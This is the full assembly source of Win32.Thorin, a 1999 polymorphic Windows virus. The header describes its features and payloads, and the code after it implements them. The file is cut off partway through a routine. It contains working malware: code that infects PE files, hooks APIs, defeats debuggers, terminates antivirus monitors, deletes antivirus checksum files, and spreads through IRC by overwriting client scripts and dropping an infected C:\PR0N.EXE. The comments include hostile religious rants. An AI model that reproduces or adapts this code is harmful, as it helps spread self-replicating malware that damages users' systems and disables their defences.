; [Win32.Thorin] - PE/mIRC/PIRCH/ViRC97/resident/semi-stealth/poly/RDA, etc.
; Copyright (c) 1999 by Billy Belcebu/iKX
;
; ??»    ??» ??» ???»   ??» ??????»  ??????»
; ???    ??? ??? ????»  ??? ???????» ???????»
; ??? ?» ??? ??? ?????» ???  ???????  ???????
; ??????»??? ??? ??????»???  ??????» ???????
; ?????????? ??? ??? ?????? ???????? ???????» ??»
;  ????????  ??? ???  ????? ???????  ???????? ???
;                        ????????» ??»  ??»  ??????»  ??????»  ??» ???»   ??»
;                        ????????? ???  ??? ????????» ???????» ??? ????»  ???
;                           ???    ???????? ???   ??? ???????? ??? ?????» ???
;                           ???    ???????? ???   ??? ???????» ??? ??????»???
;                           ???    ???  ??? ????????? ???  ??? ??? ??? ??????
;                           ???    ???  ???  ???????  ???  ??? ??? ???  ?????
;
; Virus Name    : Thorin.11932 [ Bugfix version ]
; Virus Author  : Billy Belcebu/iKX
; Origin        : Spain
; Platform      : Win32
; Target        : PE files (EXE/SCR/CPL) & mIRC/PIRCH/ViRC97 spreading
; Poly          : THME 1.0 [The Hobbit Mutation Engine]
; Unpack        : LSCE 1.0 [Little Shitty Compression Engine]
; Compiling     : TASM 5.0 and TLINK 5.0 should be used
;                       tasm32 /ml /m3 thorin,,;
;                       tlink32 /Tpe /aa /c /v thorin,thorin,,import32.lib,
;                       pewrsec thorin.exe
; Why 'Thorin'? : Heh,  are  you an incult  guy? Heh, have  you ever read the
;                 wonderful book  of the  wonderful author  J. R. R. Tolkien,
;                 called "The Hobbit"? Ok, if  you did  it, you  can  realize
;                 that the most important  dwarf is called  in this way :) He
;                 died with honour, and he  couldn't taste the victory and be
;                 the king, anyway thanks to him, the Middle-Earth was a much
;                 better world for years. Ain't it charming? ;)
; Features      : Ok, here i will list all that this babe is able to do...
;                 ? Infect PE files in current, Windows, and System dirs.
;                 ? Runtime module, infects 4 files each time.
;                 ? Per-Process residency (Import Table & GetProcAddress).
;                 ? Infects EXE, SCR & CPL files.
;                 ? Anti-Debugging features (SEH & 'IsDebuggerPresent').
;                 ? Anti-Emulation features.
;                 ? Anti-Monitors, kills AVP Monitor and AMON.
;                 ? Polymorphic layer of decryption.
;                 ? RDA layer of decryption.
;                 ? Size Stealth (FindFirstFileA/FindNextFileA).
;                 ? Fast infection (depending of the host).
;                 ? Internet aware virus: mIRC, ViRC97 and PIRCH scripts.
;                 ? Traversal routine for search for the scripts (hi LJ!).
;                 ? Packed dropper, used LSCE 1.0.
;                 ? Really tiny unpacker.
;                 ? Multiple payloads (see below).
;                 ? Doesn't hardcode KERNEL32 base address.
;                 ? Doesn't hardcode API addresses (of course).
;                 ? Gets Image Base at running time.
;                 ? Removes many AV CRC files.
;                 ? Avoids infection of certain (dangerous for us) files.
; Payloads      : Yes, this virus has multiple payloads (hi DuST!). Let's see
;                 a little  overview  of them (executed every 26 of October).
;                 1. The biggest one, based  in a  trick  that i  learnt from
;                 mandragore's viruses, dropping  a file  as C:\WIN.COM, that
;                 gets executed by the system before  of the file that should
;                 be, that is C:\WINDOWS\WIN.COM, thus bringing us the possi-
;                 bility of own the computer before windows :) Well, it cons-
;                 ists in  a very  little, simple and  easy quiz that all ppl
;                 who had read "The Hobbit" once in his life would be able to
;                 pass without problems, and consists of 3 questions.
;                 2. Sets the HD's name as 'THORIN'.
;                 3. Due an idea  that my friend  Qozah gave me, it swaps the
;                 mouse buttons, thus  making the  user be  stoned... All you
;                 clicked with the left button, now you'll have to click with
;                 the right one, and vice-versa.
;                 4. The typical MessageBox with a silly message.
;                 5. Launches user  to Microsoft page, thus annoying  him and
;                 make his little and ignorant mind to think that the awaited
;                 Micro$oft offensive  over the  earth has began. Well, ain't
;                 this one charming? ;)
; Internet      : This  virus is  able  to  spread itself using the most used
;                 IRC  programs over  the  world: mIRC, PIRCH and ViRC. Every
;                 infected  system  will  have  a  little  infected  file  in
;                 C:\PR0N.EXE. This  file  is sent to everyone that joins the
;                 channel where the  user is chatting by DCC. Very simple and
;                 effective.
; Greetings     : This virus is dedicated  to many people... Firstly, to  the
;                 iKX crew for trust in me, to the DDT past,present and futu-
;                 re crew for the friendship during the time, 29A ppl, FS ppl
;                 etc. Now, the  personal greetings (w/ no particular order):
;
;                 SeptiC - Your 'Internet aware viruses' article rules!!!
;                 b0z0 - Hi, my favourite 'little' clown :)
;                 StarZer0 - no. no, no. no sex.
;                 Int13h - I'd like you come to Spain :)
;                 Murkry - I'm glad to be in a group with this genius.
;                 n0ph - I still don't have the pleasure of knowin' you...
;                 Somniun - Si tienes alguna duda de Win32, pregunta!! ;)
;                 Wintermute - RAMMSTEIN rules! You always have reason ;)
;                 Owl - You are very isolated from the world, pal :)
;                 Vecna - The best coder of everytime.
;                 Ypsilon - Nos vemos en septiembre! :)
;                 Bumblebee - Pues eso, a ver si tu vienes tambien...
;                 TechnoPhunk - Forget catholicism and be nihilist! ;)
;                 Qozah - I'd like to do a cooperation project with ya ;)
;                 Benny - Same with you :) Yer a reely impressive codah!
;                 Super - ?Como te va en Castellon?
;                 nIgr0 - Code viruses, not 'legal' thingies!
;                 MDriller - best p0lys without any kinda discussion...
;                 T-2000 - I share ur ideas 'bout religion: radical but true
;                 SlageHammer - I loved yer city! Milano rocks! Padania rocks!
;                 VirusBuster - I've seen "Love Struck Baby" video. SRV rlz ;)
;                 LordJulus - Keep on coding, but optimize more! ;)
;
;                 Also dedicated to all the Bards around!
;
; Thoughts      : This is, nowadays, my  best virus  so far, over Iced Earth,
;                 Garaipena, and Nitro, all of  them for Windoze. I needed to
;                 do at least  a good  virus, for feed my own ego (why lie?),
;                 and i think this is  what really happened. But i won't stop
;                 there, there are many  things yet to  explore (and exploit)
;                 in 32 bit  enviroments, there are  many problems  unsolved,
;                 and i  will try  to contribute  with my humble code for all
;                 those purposes. Btw, i used, in my other viruses, to try to
;                 optimize , but  in  this virus i didn't. I  mean, you won't
;                 see here OBVIOUS lacks of optimization, like CMP reg,-1 but
;                 i will use many times the same code in different procedures
;                 many  strings, two  droppers (one for IRC distribution, and
;                 other for one payload). This virus is big in its size, well
;                 not as  Win32.Harrier,  Win32.Libertine, WinNT.Remex, etc.,
;                 but it's a 'big' one, and  i hope  this  will mean a 'good'
;                 one. Fuck, i've coded also a  lot of payloads, none of them
;                 is destructive, but all are VERY annoying... The descripti-
;                 on is above, if you don't believe me.
;                 Well, now i'm  gonna excuse myself,  because  while  making
;                 this virus (based initially  on my Win95.Iced Earth) i have
;                 noticed the great quantity of bugs that my Iced Earth virus
;                 had (believe me, more  than 10  incredible bugs!),  and i'm
;                 still wondering why all those escaped from my beta testing.
;                 Moreover, all those bugs only reflect my incompetence. With
;                 this virus i  have made  very serious tests, mainly because
;                 some delicated parts of the virus needed it to work perfec-
;                 ly (i.e. per-process  residence). Maybe there  will be also
;                 bugs, but now at least i know there are less :)
;                 My next steps  will be  the  research  in the fields of MMX
;                 polymorphism, some  metamorphism, and i  hope  that my next
;                 virus will use EPO techniques, because i haven't experimen-
;                 ted yet with such a kewl thing.
; Politics      : Benny doesn't like that i use to talk about politics, but i
;                 have put it there  just for explain some  things that could
;                 guide you to  misunderstand my  way of act. Everybody knows
;                 that i tend to  Marxism, right? Well, but  i'm  not  saying
;                 with this that  i support  Fidel Castro, Mao, and such like
;                 pseudo-communists (that tend to totalitarism). I think that
;                 everybody must have  the same oportunities, and without any
;                 kind of discrimination. But as i  am not a guy with an only
;                 idea, i  support also (if there isn't any other choice) the
;                 democracy, but i prefer it to be  a democracy as participa-
;                 tion and not as a procediment. Whom has studied some philo-
;                 sophy will know of what  i am  talking about: avoid the fi-
;                 erce  and  discriminatory capitalism. As i am tolerant, you
;                 can be againist my  ideas, and i  will accept it. So Benny,
;                 i'm not a totalitarian asshole, just the opposite, i'm just
;                 a young idealist :) Be free, enjoy life...
; Final note    : Although it  screwed me  a lot, i  haven't put  data in the
;                 heap as i used to  do because this virus is too big and the
;                 data used temporally is also too big, and it generated some
;                 protection faults... SHIT!!!!
;
;                              That is not dead
;                           which can eternal lie
;                           yet with strange aeons
;                             even death may die
;
;                             -H. P. Lovecraft-
;
; (c) 1999 Billy Belcebu/iKX

		.586p
		.model  flat
		.data

; 1st gen exported apis

extrn           MessageBoxA:PROC
extrn           ExitProcess:PROC

; Some useful equates

virus_size      equ     (offset virus_end-offset virus_start)
poly_virus_size equ     (offset crypt_end-offset thorin)
shit_b4_delta   equ     (offset delta-offset virus_start)
encrypt_size    equ     (crypt_end-crypto)
non_crypt_size  equ     (virus_size-encrypt_size-rda_decryptor)
rda_decryptor   equ     (virus_end-crypt_end)
section_flags   equ     00000020h or 20000000h or 80000000h
directory_attr  equ     00000010h
temp_attributes equ     00000080h
drop_old_size   equ     00011000d
n_Handles       equ     50d
WFD_HndSize     equ     n_Handles*8

n_infections    equ     04h
bad_number      equ     09h

orig_size       equ     044h
mark            equ     04Ch
ddInfMark       equ     "NRHT"

kernel_         equ     0BFF70000h              ; Only used if the K32 search
kernel_wNT      equ     077F00000h              ; fails...

imagebase_      equ     000400000h              ; y0h0h0

; Interesting macros for my code

cmp_            macro   reg,joff1               ; Optimized version of
		inc     reg                     ; CMP reg,0FFFFFFFFh
		jz      joff1                   ; JZ  joff1
		dec     reg                     ; The code is reduced in 3
		endm                            ; bytes (7-4)

cmpz            macro   reg,joff2               ; Optimized version of
		xchg    reg,ecx                 ; CMP reg,00h
		jecxz   joff2                   ; JZ  joff2
		endm                            ; Code reduced in 2 bytes

cmpz_           macro   reg,joff3               ; Blah
		or      reg,reg
		jz      joff3
		endm

apicall         macro   apioff                  ; Optimize muthafucka!
		call    dword ptr [ebp+apioff]
		endm

rva2va          macro   reg,base                ; Only for make preetiest the
		add     reg,[ebp+base]          ; code ;)
		endm

virussize       macro
		db      virus_size/10000 mod 10 + "0"
		db      virus_size/01000 mod 10 + "0"
		db      virus_size/00100 mod 10 + "0"
		db      virus_size/00010 mod 10 + "0"
		db      virus_size/00001 mod 10 + "0"
		endm

; Some shitty thingies in data section... 1st gen host messages

		.data

szTitle         db      "[Win32.Thorin]",0
szMessage       db      "First Generation Sample",10
		db      "Virus Size : "
		virussize
		db      " bytes"
		db      10
		db      "Copyright (c) 1999 by Billy Belcebu/iKX",0

; El ke mucho llora es porke no mama!

	 .code

; ===========================================================================
; Virus code
; ===========================================================================
; DU HAST MICH!!!

virus_start     label   byte

poly_layer      db LIMIT dup (90h)              ; Space for poly-decryptor

thorin:
	pushad                                  ; Push all da shit
	pushfd

	fwait                                   ; Reset coprocessor
	fninit                                  

	call    kill_av                         ; Anti-emulation trick

	mov     esp,[esp+08h]
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx
	jmp     over_trap

kill_av:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp
	dec     byte ptr [edx]
	jmp     over_rda

over_trap:
	call    delta                           ; Hardest code to undestand ;)
delta:  pop     ebp
	mov     eax,ebp
	sub     ebp,offset delta

	sub     eax,shit_b4_delta
	sub     eax,00001000h
NewEIP  equ     $-4

	push    eax                             ; Save it
	or      ebp,ebp                         ; Goddamn first gen...
	jz      over_rda
	call    rda_crypt
	jmp     over_rda

; ===========================================================================
; RDA Layer (Random Decryption Algorithm)
; ===========================================================================
; I have become a direct. I have become insurgent.

rda_crypt       proc
	xor     ebx,ebx                         ; Clear counter
try_another_key:
	call    crypt                           ; Try to decrypt it
	push    ebx                             ; Save counter
	lea     esi,[ebp+crypto]                ; Load address to crypt
	mov     edi,encrypt_size                ; Size to crypt
	call    CRC32                           ; Get its CRC32
	pop     ebx                             ; Restore counter
	cmp     eax,12345678h                   ; Actual CRC32=CRC32 unencrypted?
CRC     equ     $-4     
	jz      rda_done                        ; Yeah, then we decrypted it
	call    crypt                           ; Nopes, fix it
	inc     ebx                             ; increase key
	jmp     try_another_key                 ; Try with another key
rda_done:
	ret
rda_crypt       endp

crypt           proc                            ; This procedures simplifies
	lea     edi,[ebp+crypto]                ; the task (and optimizes) of
	mov     ecx,encrypt_size                ; encrypt with a determinated
rda_:   xor     byte ptr [edi],bl               ; key
	inc     edi
	loop    rda_
	ret
crypt           endp

; Legalizar consimizion, no te konviene... se akaba el filon!

; ===========================================================================
; CRC32 calculator [by Vecna]
; ===========================================================================
;
; input:
;        ESI = Offset where code to calculate begins
;        EDI = Size of that code
; output:
;        EAX = CRC32 of given code
;

CRC32           proc
	cld
	push    ebx
	xor     ecx,ecx                         ; Optimized by me - 2 bytes
	dec     ecx                             ; less
	mov     edx,ecx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:  dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
	dec     edi                             ; Another fool byte less
	jnz     NextByteCRC
	not     edx
	not     ecx
	pop     ebx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
	ret
CRC32           endp

crypto  equ     $

	db      " [IAIDA] "                    ; Little message to the pree-
						; tiest girl over the earth.
						; She deserves much more, i
						; know... anyway... she's here!

; No penseis ke soy baboso, ein?!?!?!?!?!? :)

over_rda:
	pop     eax
	mov     dword ptr [ebp+ModBase],eax     ; EAX = Image Base of module


	call    ChangeSEH                       ; SEH rlz.
	mov     esp,[esp+08h]                   ; Restore stack
	jmp     RestoreSEH
ChangeSEH:
	xor     ebx,ebx                         ; Joder, no joderemos...
	push    dword ptr fs:[ebx]              ; pero ­JODER! las ganas ke
	mov     fs:[ebx],esp                    ; tenemos :)

	and     byte ptr [ebp+inNT],00h         ; Make zero inNT variable

	mov     ecx,cs                          ; Check if we are under WinNT
	xor     cl,cl
	jecxz   WinNT                           ; ECX = 0 - WinNT;100 - Win9X
	jmp     shock

WinNT:
	inc     byte ptr [ebp+inNT]             ; If NT, mark this
shock:
	mov     esi,[esp+2Ch]                   ; Get program return address
	mov     ecx,05d                         ; Max level
	call    GetK32

; I hate the catholicism... I HATE THE CATHOLICISM!!!! STOP HIPOCRISY!!!!!!!!
; STOP THOSE GODDAMN LIES!!! What is that? God helps us? Hahahahah!!! So, you
; stupid catholic asshole... why  there are wars, genocides, etc? Why we, the
; human race, are as cruel with other humans, the nature, and everything that
; goes againist our own process to earn money? Open your eyes... i won't make
; you change using the power... just change yourself... it's your choice.

asakopako:
	mov     dword ptr [ebp+kernel],eax      ; EAX must be K32 base address

; This is the main branch of the virus

	lea     edi,[ebp+@@Offsetz]
	lea     esi,[ebp+@@Namez]
	call    GetAPIs                         ; Retrieve all APIs
	
	call    AntiDebugger                    ; Antidebug their arse

	call    PrepareInfection                ; Set-up infection

	call    KillMonitors                    ; Kill AV monitors
	
	call    InfectItAll                     ; Infect dirs
	
	call    DropPR0N                        ; Unpack and drop PR0N.EXE
	
	call    TraversalSearch                 ; Search for scripts and dr0p
	
	call    HookAllAPIs                     ; Hook IT APIs

; Ok, we prepare to end the adventure...

	push    WFD_HndSize                     ; Hook some mem for WFD_Handles
	push    00000000h                       ; structure
	apicall _GlobalAlloc
	mov     dword ptr [ebp+WFD_HndInMem],eax

; Activate payload every 26th of October, a magical day.

	lea     eax,[ebp+SYSTEMTIME]
	push    eax
	apicall _GetSystemTime

	cmp     word ptr [ebp+ST_wDay],31d
	jnz     continue_payload
	jmp     delete_key

continue_payload:
	cmp     word ptr [ebp+ST_wDay],26d
	jnz     no_payload

	cmp     word ptr [ebp+ST_wMonth],10d
	jnz     no_payload

	call    payload                         ; Well... payloads :)

no_payload:
	xchg    ebp,ecx                         ; 1st gen shit
	jecxz   fakehost_

RestoreSEH:
	xor     ebx,ebx                         ; Restore old SEH handler
	pop     dword ptr fs:[ebx]
	pop     eax

	popfd                                   ; Restore registers & flags
	popad

	mov     ebx,12345678h                   ; Here goes program's EIP
	org     $-4
OldEIP  dd      00001000h

	add     ebx,12345678h                   ; And here its base address
	org     $-4
ModBase dd      imagebase_

	push    ebx                             ; We return control to host
	ret

fakehost_:
	jmp     fakehost                        ; 1st gen shitz0r

; CATHOLICISM = FASCISM = SHIT

delete_key:                                     ; This gets executed once 
	lea     esi,[ebp+key_mIRC]              ; each 2 months :)
	call    DelReg
	lea     esi,[ebp+key_PIRCH]
	call    DelReg
	lea     esi,[ebp+key_ViRC97]
	call    DelReg
	jmp     no_payload

; ===========================================================================
; Most important virus info :)
; ===========================================================================

vname   label   byte
	db      "[Win32.Thorin."
	virussize
	db      " v1.00]",00h
copyr   db      "Copyright (c) 1999 by Billy Belcebu/iKX",0

; ===========================================================================
; Obtain useful info that will be used in infection process
; ===========================================================================

PrepareInfection:
	lea     edi,[ebp+WindowsDir]            ; Pointer to the variable
	push    7Fh                             ; Size of dir variable
	push    edi                             ; Push it!
	apicall _GetWindowsDirectoryA

	add     edi,7Fh                         ; Pointer to the variable
	push    7Fh                             ; Size of dir variable
	push    edi                             ; Push it!
	apicall _GetSystemDirectoryA

	add     edi,7Fh                         ; Pointer to the variable
	push    edi                             ; Size of dir variable
	push    7Fh                             ; Push it!
	apicall _GetCurrentDirectoryA

	lea     eax,[ebp+szUSER32]              ; Get all needed APIs from 
	push    eax                             ; the USER32.DLL library
	apicall _LoadLibraryA

	xchg    eax,ebx

	lea     edi,[ebp+@@USER32_APIs]         ; Pointer to API strings
	lea     esi,[ebp+@@USER32_Addresses]    ; Pointer to API addresses
retrieve_user32_apis:   
	push    edi                             ; Push pointer to string
	push    ebx                             ; Push USER32 base address
	apicall _GetProcAddress

	xchg    edi,esi                         ; Store the address
	stosd
	xchg    edi,esi

	xor     al,al                           ; Get the end of string
	scasb
	jnz     $-1

	cmp     byte ptr [edi],""              ; I like girls...
	jz      all_user32_apis                 ; Is last api?
	jmp     retrieve_user32_apis

all_user32_apis:
	lea     eax,[ebp+szADVAPI32]            ; Here we will get all needed
	push    eax                             ; APIs from ADVAPI32.DLL
	apicall _LoadLibraryA
	xchg    eax,ebx

	lea     edi,[ebp+@@ADVAPI32_APIs]       ; Pointer to API names
	lea     esi,[ebp+@@ADVAPI32_Addresses]  ; Pointer to API addresses
retrieve_advapi32_apis:
	push    edi                             ; Push pointer to name
	push    ebx                             ; Push ADVAPI32 base address
	apicall _GetProcAddress

	xchg    edi,esi                         ; Store API address
	stosd           
	xchg    edi,esi

	xor     al,al                           ; Get the end of API string
	scasb
	jnz     $-1

	cmp     byte ptr [edi],""              ; I like music [:)~
	jz      all_advapi32_apis
	jmp     retrieve_advapi32_apis

all_advapi32_apis:
	ret

; Heh, a greeting to the man (and the book!) that inspired this virus :)

	db      0,"[The Hobbit (c) 1937 by J.R.R. Tolkien]",0

; ===========================================================================
; Infect current, Windows and System directories
; ===========================================================================

InfectItAll:
	lea     edi,[ebp+directories]           ; Pointer to 1st directory
	mov     byte ptr [ebp+mirrormirror],dirs2inf ; Set up variable
requiem:
	push    edi                             ; Set as current dir the
	apicall _SetCurrentDirectoryA           ; dir to infect
	
	call    DeleteShit                      ; Delete AV CRC files

	push    edi

; Initialize this values for each directory processed

	and     byte ptr [ebp+CurrentExt],00h
	lea     esi,[ebp+EXTENSIONS]
	lea     edi,[ebp+EXTENSION]

infect_all_masks:
	cmp     byte ptr [ebp+CurrentExt],n_EXT
	jae     all_mask_infected

	lodsd                                   ; EAX = EXTENSION
	mov     [edi],eax                       ; No STOSD! We don't want EDI
						; to change...       

	push    edi esi
	call    Infect                          ; Infect some files
	pop     esi edi

	inc     byte ptr [ebp+CurrentExt]
	jmp     infect_all_masks
all_mask_infected:
	pop     edi

	add     edi,7Fh                         ; Get another directory

	dec     byte ptr [ebp+mirrormirror]     ; Check if we infected all
	cmp     byte ptr [ebp+mirrormirror],00h ; available directories
	jnz     requiem
	ret

; ===========================================================================
; Search MASK and infect found uninfected files
; ===========================================================================

Infect: and     dword ptr [ebp+infections],00000000h ; reset countah
	lea     eax,[ebp+offset WIN32_FIND_DATA] ; Find's shit
	push    eax

	lea     eax,[ebp+offset _MASK]
	push    eax

	apicall _FindFirstFileA                 ; Get first file on directory
	cmp_    eax,FailInfect                  ; Failed? Shit...
	mov     dword ptr [ebp+SearchHandle],eax

__1:    lea     edi,[ebp+WFD_szFileName]
	call    AvoidShitFiles
	jc      __2

	push    dword ptr [ebp+NewEIP]
	push    dword ptr [ebp+OldEIP]
	push    dword ptr [ebp+ModBase]
	call    Infection                       ; Infect file
	pop     dword ptr [ebp+ModBase]
	pop     dword ptr [ebp+OldEIP]
	pop     dword ptr [ebp+NewEIP]
	jc      __2

	inc     byte ptr [ebp+infections]
	cmp     byte ptr [ebp+infections],n_infections ; Did we infected them?
	jae     FailInfect                      ; Yeah... :)

__2:    lea     edi,[ebp+WFD_szFileName]        ; Clear name field
	mov     ecx,MAX_PATH
	xor     al,al
	rep     stosb

	lea     eax,[ebp+offset WIN32_FIND_DATA] ; Search for another file
	push    eax
	push    dword ptr [ebp+SearchHandle]
	apicall _FindNextFileA
	cmpz    eax,CloseSearchHandle
	jmp     __1

CloseSearchHandle:
	push    dword ptr [ebp+SearchHandle] ; Close search handle
	apicall _FindClose
FailInfect:
	ret

	db      0,"[Luthien is still alive in the world]",0

; ===========================================================================
; Traversal search for mIRC and PIRCH scripts (modified version of LJ's code)
; ===========================================================================

TraversalSearch:
	lea     esi,[ebp+tempcurdir]            ; Get the current directory
	push    esi                             ; (We only want the current
	push    7Fh                             ; drive)
	apicall _GetCurrentDirectoryA

	lodsb                                   ; Get drive

	mov     byte ptr [ebp+root],al          ; Put it in its variable

	lea     eax,[ebp+root]                  ; Reach the root directory
	push    eax                             ; of the current drive
	apicall _SetCurrentDirectoryA

Traversal:
	lea     esi,[ebp+key_mIRC]              ; Already catched? Avoid 
	call    RegExist                        ; this if so, as it needs many
	jc      nomoretosearch                  ; time, and the user could
	lea     esi,[ebp+key_PIRCH]             ; notice our presence :)
	call    RegExist
	jc      nomoretosearch
	lea     esi,[ebp+key_ViRC97]
	call    RegExist
	jc      nomoretosearch
	xor     ebx,ebx                         ; Clear counter

findfirstdir:
	lea     edi,[ebp+_WIN32_FIND_DATA]      ; Search for directories
	push    edi
	lea     eax,[ebp+ALL_MASK]
	push    eax
	apicall _FindFirstFileA
	cmp_    eax,notfoundfirstdir

	mov     dword ptr [ebp+TSHandle],eax

main_trav:
	cmp     dword ptr [ebp+_WFD_dwFileAttributes],directory_attr
	jnz     findnextdir

	lea     eax,[ebp+_WFD_szFileName]       
	cmp     byte ptr [eax],"."              ; Is dir "." or ".."? 
	jz      findnextdir                     ; Shitz

	push    eax
	apicall _SetCurrentDirectoryA

	pushad
	call    Worms                           ; Let's rock!
	popad

	push    dword ptr [ebp+TSHandle]        ; Save handle
	inc     ebx                             ; Increase counter :)
	jmp     findfirstdir
findnextdir:
	push    edi                             ; Search for another dir
	push    dword ptr [ebp+TSHandle]
	apicall _FindNextFileA
	cmpz    eax,notfoundfirstdir

	jmp     main_trav
notfoundfirstdir:
	lea     eax,[ebp+dotdot]                ; Go back 1 dir
	push    eax
	apicall _SetCurrentDirectoryA

	or      ebx,ebx                         ; Are we in root? yeah, it's
	jz      nomoretosearch                  ; over! our search finished! 

	dec     ebx                             ; Decrease countah
	pop     dword ptr [ebp+TSHandle]
	jmp     findnextdir

notfoundnextdir:
	push    dword ptr [ebp+TSHandle]
	apicall _FindClose
	jmp     notfoundfirstdir

nomoretosearch:
	lea     esi,[ebp+key_PIRCH]             ; Mark all registry keys...
	call    PutReg
	lea     esi,[ebp+key_mIRC]
	call    PutReg
	lea     esi,[ebp+key_ViRC97]
	call    PutReg

	lea     esi,[ebp+tempcurdir]            ; And put current directory
	push    esi                             ; back :)
	apicall _SetCurrentDirectoryA
	ret

	db      0,"[Thorin,Dori,Nori,Ori,Balin,Dwalin,Fili,Kili,Oin,Gloin,"
	db      "Bifur,Bofur,Bombur]",0

; ===========================================================================
; Worms (mIRC & PIRCH) installer
; ===========================================================================

Worms:
	call    DeleteShit                      ; Delete AV CRCs from all dir
	push    80h                             ; We test for the presence of
	lea     eax,[ebp+PirchWormFile]         ; the scripts by setting a
	push    eax                             ; normal attribute to them.
	apicall _SetFileAttributesA             ; If the api returns us an
	xchg    eax,ecx                         ; error, then we know the
	jecxz   TryWithMIRC                     ; file doesn't exist :)
	jmp     BorrowPIRCH                     ; As in DOS! ;)
TryWithMIRC:
	push    80h
	lea     eax,[ebp+mIRCWormFile]
	push    eax
	apicall _SetFileAttributesA
	xchg    eax,ecx
	jecxz   TryWithViRC97
	jmp     BorrowMIRC
TryWithViRC97:
	push    80h
	lea     eax,[ebp+ViRC97WormFile]
	push    eax
	apicall _SetFileAttributesA
	xchg    eax,ecx
	jecxz   ExitWorms
	jmp     BorrowViRC97       
ExitWorms:
	ret

; ===========================================================================
; PIRCH script overwrite
; ===========================================================================

BorrowPIRCH:                                    ; If file found, drop the
	xor     eax,eax                         ; new script file
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h
	call    _PIRCH

PirchWormFile db "events.ini",0                 ; What to overwrite

_PIRCH: apicall _CreateFileA

	mov     dword ptr [ebp+TempHandle],eax

	push    00000000h                       ; Overwrite with our script :)
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    PirchWormSize
	lea     ebx,[ebp+PirchWorm]
	push    ebx
	push    eax
	apicall _WriteFile

	mov     ecx,PirchWormSize               ; And trunc the file, so there
	call    TruncFile                       ; won't be more shit ;)

	push    dword ptr [ebp+TempHandle]
	apicall _CloseHandle
	ret

; ===========================================================================
; mIRC script overwrite
; ===========================================================================

BorrowMIRC:                                     ; Same as above, but with
	xor     eax,eax                         ; mIRC scripts
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h
	call    _mIRC

mIRCWormFile db "mirc.ini",0

_mIRC:  apicall _CreateFileA

	mov     dword ptr [ebp+TempHandle],eax

	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    mIRCWormSize
	lea     ebx,[ebp+mIRCWorm]
	push    ebx
	push    eax
	apicall _WriteFile

	mov     ecx,mIRCWormSize
	call    TruncFile

	push    dword ptr [ebp+TempHandle]
	apicall _CloseHandle
	ret

; ===========================================================================
; ViRC97 script overwrite
; ===========================================================================

BorrowViRC97:                                   ; Same as above, but with
	xor     eax,eax                         ; ViRC97 scripts
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h
	call    _ViRC97

ViRC97WormFile db "default.lib",0

_ViRC97:apicall _CreateFileA

	mov     dword ptr [ebp+TempHandle],eax

	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    ViRC97WormSize
	lea     ebx,[ebp+ViRC97Worm]
	push    ebx
	push    eax
	apicall _WriteFile

	mov     ecx,ViRC97WormSize
	call    TruncFile

	push    dword ptr [ebp+TempHandle]
	apicall _CloseHandle
	ret

; ===========================================================================
; Unpack, drop and infect our PE file [TROJAN mode]
; ===========================================================================

DropPR0N:
	push    drop_old_size                   ; Allocate some memory
	push    00000000h
	apicall _GlobalAlloc
	cmpz    eax,_ExitDropPR0N
	mov     dword ptr [ebp+GlobalAllocHnd],ecx

	mov     edi,dropper_size                ; Unpack in allocated memory
	xchg    edi,ecx                         ; the dropper
	lea     esi,[ebp+dropper]
	call    LSCE_UnPack

	push    00000000h                       ; Create the dropper on
	push    00000080h                       ; C:\PR0N.EXE (hi darkman!) ;)
	push    00000002h
	push    00000000h
	push    00000001h
	push    40000000h
	call    _PR0N

pr0nfile db      "C:\PR0N.EXE",0

_ExitDropPR0N:
	jmp ExitDropPR0N

_PR0N:  apicall _CreateFileA

	push    eax                             ; Write it, sucka!
	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    drop_old_size
	push    dword ptr [ebp+GlobalAllocHnd]
	push    eax
	apicall _WriteFile
	apicall _CloseHandle

	lea     edi,[ebp+pr0nfile]              ; Infect it
	call    _Infection

	push    dword ptr [ebp+GlobalAllocHnd]  ; And free allocated memory
	apicall _GlobalFree
ExitDropPR0N:
	ret

; ===========================================================================
; Self protect virus againist debuggers
; ===========================================================================

AntiDebugger:
	apicall _GetVersion                     ; Check for Win95, as it dont
	cmp     eax,80000000h                   ; have the IsDebuggerPresent
	jb      BetterNot                       ; API.

	cmp     ax,0A04h
	jb      BetterNot

	lea     esi,[ebp+@IsDebuggerPresent]
	call    GetAPI_ET
	call    eax                             ; Are we being debugged? Shit!
	cmpz    eax,BetterNot

	cli                                     ; Who said that Windoze don't
	jmp     $-1                             ; use interrupts? ;) Int8 rlz

BetterNot:
	ret

	db      0,"[Dedicated to all Tolkien fans over the middle-earth]",0

; ===========================================================================
; Kill AV CRC files
; ===========================================================================

DeleteShit:
	pushad
	lea     edi,[ebp+@@BadPhilez]           ; Load pointer to first file
	mov     ecx,bad_number                  ; Number of files to erase

killem: push    ecx                             ; Save the number
	push    edi                             ; Push file to erase
	apicall _DeleteFileA                    ; Delete it!
	pop     ecx                             ; Restore the number
	xor     al,al                           ; Get the next file
	scasb
	jnz     $-1
	loop    killem                          ; Loop and delete another :)
	popad
	ret

; ===========================================================================
; Kill the processes of determinated AV monitors
; ===========================================================================

KillMonitors:
	lea     edi,[ebp+Monitors2Kill]
KM_L00p:
	call    TerminateProc
	xor     al,al                           ; Reach the end of string
	scasb
	jnz     $-1
	cmp     byte ptr [edi],0BBh             ; Last item of array?
	jnz     KM_L00p
	ret

; ===========================================================================
; Avoid infection of certain files
; ===========================================================================
;
; input:
;       EDI = Pointer to file name
; output:
;       CF  = Set to 1 if it exist, to 0 if it doesn't
;

AvoidShitFiles:
	lea     esi,[ebp+@@BadProgramz]         ; Ptr to table
